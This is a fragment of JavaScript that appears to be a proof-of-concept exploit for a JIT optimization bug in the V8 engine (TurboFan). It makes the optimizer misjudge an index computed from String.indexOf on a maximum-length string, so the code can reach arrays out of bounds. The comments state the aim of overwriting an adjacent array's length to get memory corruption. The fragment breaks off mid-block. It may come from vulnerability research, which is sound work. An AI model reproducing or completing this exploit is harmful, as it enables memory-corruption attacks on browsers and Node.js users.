...
function maxstring() {
  // force TurboFan in use.
  try {} finally {}

  //2**28 - 16 <=> 0xffffff0, kStringMaxLength == 2**28 - 16 
  //https://v8docs.nodesource.com/node-8.11/d2/db3/classv8_1_1_string.html#a5af5e377001f8fe7e43b952fd6a0d96f

  
  var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28); 
  i += 16;
  i >>= 28; // real i = 1, optimizer: i = 0
  i *= 6; // real value i = 10000, optimizer: i = 0
  if (i > 3) {
      //if optimize enabled, branch determined by JIT
    return 0;
  } else {
    //DCHECK??
    //arr1 | arr1_element | arr2 | arr2_element | arr3 | arr3_element
    var double_arr1 = new Array(0.1, 0.2);
    var double_arr2 = new Array(0.2, 0.2);
    var obj_arr2    = new Array({},{});
    
    // var target    = new ArrayBuffer(0x10);

    //our approach will be overwriting double_arr2's length with OOB Write.
    
    //try to make effect with single usage of overwrite with out-of-bound i.

    //in order to get value, we need to express this thing explicit.
    let probe = double_arr1[i];
    if(probe != undefined){
    %DebugPrint(double_arr1);
